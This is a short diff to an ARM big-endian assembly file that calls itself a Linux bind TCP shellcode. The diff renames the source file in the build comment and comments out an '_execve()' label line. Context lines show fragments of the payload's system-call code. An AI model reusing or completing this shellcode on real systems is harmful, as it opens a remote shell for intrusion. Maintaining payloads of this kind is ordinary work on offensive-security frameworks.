@@ -9,7 +9,7 @@
 @        Implementation of a Linux bind TCP shellcode for ARM BE architecture.
 @
 @        Assemble with: 
-@          armeb-buildroot-linux-uclibcgnueabi-as -mthumb single_sock_bind.s -o shellcode.o
+@          armeb-buildroot-linux-uclibcgnueabi-as -mthumb armeb_linux_ipv4_bind_tcp.s -o shellcode.o
 @        Link with:
 @          armeb-buildroot-linux-uclibcgnueabi-ld shellcode.o -o shellcode
 @
@@ -95,7 +95,7 @@
 		add	r1, r1, #1
 		svc	1
 
-		 _execve()
+@		 _execve()
 		sub	r2, r2, r2
 		mov 	r0, pc
 		add 	r0, #18
